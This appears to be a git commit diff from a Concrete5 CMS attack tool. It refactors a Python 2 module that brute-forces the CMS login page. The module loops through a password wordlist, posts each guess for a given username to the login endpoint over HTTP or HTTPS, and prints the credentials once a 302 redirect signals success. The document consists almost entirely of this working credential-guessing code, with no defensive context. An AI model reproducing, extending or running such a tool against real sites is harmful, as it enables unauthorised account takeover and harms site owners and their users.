39d192fd0aaad254ff93f2bf75086cf45c8598fb
thexerocouk <toby.reynolds1@gmail.com>
2014-07-23 22:51:52 +0100

    Modulized y

--- modules/login.py
+++ modules/login.py
@@ -1,39 +1,34 @@
 #!/usr/bin/python
 
-import httplib, string, sys, urllib
+## modules/login.py
+## File contains the single threaded brute-force login module
+
+import string
+import urllib
+from modules import client
 
 bold = '\033[1m'
 normal = '\033[0m'
 
-def brutelogin(target, dir,ssl, user, wordlist):
 
-        try:
-		headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain", "Referer": "http://" + target + dir + "index.php/login/", "Cookie":"CONCRETE5=1234"}
-
-		for password in open(wordlist):
-			params = urllib.urlencode({'uName': user, 'uPassword': password.rstrip()})
-
-
-	                if ssl == True: ## Enables SSL
-        	                conn = httplib.HTTPSConnection(target)
-        	                conn.request("POST", dir + "index.php/login/do_login/", params, headers)
-        	                response = conn.getresponse()
-        	                data = response.status
-        	                conn.close()
-
-                	else: ## Uses plain-text HTTP
-                	        conn = httplib.HTTPConnection(target)
-                	        conn.request("POST", dir + "index.php/login/do_login", params, headers)
-                	        response = conn.getresponse()
-                	        data = response.status
-                	        conn.close()
-
-			if data == 302:
-				print "\n", bold, "[+] Validate username/password found\r", normal
-				print "", user + ":" + password
-				break
+## Single-threaded module to brute-force login credentials
+def brute(target, dir,ssl, user, wordlist):
+    try:
+        for password in open(wordlist):
+            params = urllib.urlencode({'uName': user, 'uPassword': password.rstrip()})
 
 
-        except Exception, error:
-                print error
+            if ssl == True:
+                data, status = client.https_post(target, dir + "index.php/login/do_login/", params)
+
+            else:
+                data, status = client.http_post(target, dir + "index.php/login/do_login/", params)
+
+            if status == 302:
+                print "\n", bold, "[+] Validate credentials found\r", normal
+                print "", user + ":" + password
+                break
+
+    except Exception, error:
+        print error
 
